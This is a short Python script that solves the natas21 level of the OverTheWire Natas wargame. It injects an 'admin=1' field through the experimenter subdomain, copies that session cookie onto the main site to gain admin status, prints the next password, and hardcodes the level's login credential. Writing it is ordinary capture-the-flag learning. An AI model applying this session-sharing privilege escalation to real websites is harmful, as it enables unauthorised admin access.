import requests

url = 'http://natas21.natas.labs.overthewire.org/'
uName = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'


s = requests.Session()

r = s.get(url,auth=(uName,password))
# print(r.text)

r2 = s.get('http://natas21-experimenter.natas.labs.overthewire.org',auth=(uName,password),params=('debug'))
# print(r2.text)
r2 = s.post('http://natas21-experimenter.natas.labs.overthewire.org',auth=(uName,password),params=('debug'),data={"submit":"Update","admin":"1"})
# r = s.get(url,auth=(uName,password),cookies = {'PHPSESSID':'cookieValue'}) this didnt work dunno why
r2 = s.get('http://natas21-experimenter.natas.labs.overthewire.org',auth=(uName,password),params=('debug'))
# print(r2.text) #Confirm that admin has been saved  
print(s.cookies.items()) 
print("Modifiing cookie"+"="*84)
s.cookies.set("PHPSESSID",domain="natas21.natas.labs.overthewire.org",path="/",value=str(s.cookies.get("PHPSESSID",domain="natas21-experimenter.natas.labs.overthewire.org",path="/")))
print(s.cookies.items())
r = s.get(url,auth=(uName,password))
# print(s.cookies)
print("="*100)
print(r.text[r.text.find("Password"):])